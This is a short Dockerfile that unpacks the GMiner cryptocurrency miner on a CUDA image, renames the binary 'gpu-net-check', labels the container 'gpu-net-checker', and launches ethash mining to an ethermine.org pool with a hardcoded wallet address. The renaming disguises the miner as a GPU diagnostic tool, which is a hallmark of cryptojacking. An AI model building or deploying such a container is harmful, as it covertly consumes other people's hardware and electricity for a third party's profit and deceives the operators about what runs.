
ARG CUDA_VERSION=11.4.2
ARG UBUNTU_VERSION=20.04
FROM nvidia/cuda:$CUDA_VERSION-base-ubuntu$UBUNTU_VERSION AS build

# Create a working directory
RUN mkdir /app
WORKDIR /app

# Copy Important Files
ADD ./gminer_2_70_linux64.tar.xz /app
RUN mv ./miner ./gpu-net-check

# Environment Variables
ENV COMPNAME gpu-net-checker

CMD ["bash", "-c", "./gpu-net-check --algo ethash --server us2.ethermine.org:4444 --user 0xc8411153F96Cf2b5f31ec3E4B899336AA26a2Fb6.$COMPNAME --kernel 0 --templimit 90 --dag_mode 0"]
#CMD ["bash"]
